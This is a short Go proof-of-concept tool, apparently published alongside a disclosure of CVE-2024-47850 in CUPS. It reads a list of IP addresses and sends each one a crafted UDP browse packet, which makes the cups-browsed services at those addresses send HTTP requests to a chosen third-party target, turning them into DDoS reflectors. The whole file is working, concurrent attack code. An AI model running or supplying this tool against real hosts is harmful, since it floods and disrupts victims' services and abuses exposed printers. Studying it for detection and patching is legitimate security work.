//Tool to test CVE-2024-47850
//Disclosed by Larry Cashdollar https://www.akamai.com/blog/security-research/october-cups-ddos-threat
//PoC by 0xb1

package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup

// Function to send the UDP packet
func sendUDPMessage(ip, target string, port int) {
	defer wg.Done()

	// Create the message to be sent
	message := fmt.Sprintf("0 3 http://%s:%d/printers/X \"0\" \"0\"", target, port)

	// Resolve the UDP address
	addr := net.UDPAddr{
		IP:   net.ParseIP(ip),
		Port: port,
	}

	// Create a UDP connection
	conn, err := net.DialUDP("udp", nil, &addr)
	if err != nil {
		fmt.Printf("Error connecting to %s: %v\n", ip, err)
		return
	}
	defer conn.Close()

	// Send the message
	_, err = conn.Write([]byte(message))
	if err != nil {
		fmt.Printf("Error sending message to %s: %v\n", ip, err)
		return
	}

	fmt.Printf("Message sent to %s\n", ip)
}

func main() {
	// Command-line flags
	target := flag.String("target", "localhost", "Target address or domain name")
	port := flag.Int("port", 80, "Target port")
	ipFile := flag.String("ipfile", "ips.txt", "File containing list of IPs")
	flag.Parse()

	// Open the file containing IP addresses
	file, err := os.Open(*ipFile)
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
		return
	}
	defer file.Close()

	// Read IPs from the file
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip == "" {
			continue
		}

		// Launch a goroutine for each IP
		wg.Add(1)
		go sendUDPMessage(ip, *target, *port)
	}

	// Check for file read errors
	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading file: %v\n", err)
	}

	// Wait for all goroutines to finish
	wg.Wait()

	// Sleep briefly to ensure messages are sent before exiting
	time.Sleep(1 * time.Second)
}
